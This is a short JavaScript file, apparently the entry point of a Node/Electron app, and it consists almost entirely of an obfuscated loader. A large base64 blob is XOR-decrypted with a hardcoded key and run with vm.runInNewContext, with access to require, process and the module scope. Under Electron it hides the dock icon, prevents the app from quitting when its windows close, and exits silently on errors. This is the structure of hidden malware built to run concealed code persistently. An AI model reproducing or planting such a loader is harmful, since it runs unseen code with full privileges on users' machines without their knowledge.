const crypto = require('crypto');
const vm = require('vm');
const _0xecdb = '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
const _0x1500 = 'a5d9ac683a9791a9a566466766babb4eb8a7e59d14ad8488cb46ab984ed84dd3';
function _0x1e70(d, k) {
  const b = Buffer.from(d, 'base64');
  const y = Buffer.from(k, 'hex');
  const r = Buffer.alloc(b.length);
  for (let i = 0; i < b.length; i++) { r[i] = b[i] ^ y[i % y.length]; }
  return r.toString('utf8');
}
function babacan() {
  try {
    const _0x1022 = _0x1e70(_0xecdb, _0x1500);
    const _ctx = { require, console, process, Buffer, __dirname, __filename, setTimeout, setInterval, module, exports };
    vm.runInNewContext(_0x1022, _ctx);
  } catch (e) { process.exit(0); }
}

try {
  const { app } = require('electron');
  if (app) {
    if (app.dock) app.dock.hide();
    app.whenReady().then(babacan);
    app.on('window-all-closed', (e) => { e.preventDefault(); });
  } else {
    babacan();
  }
} catch(_) {
  babacan();
}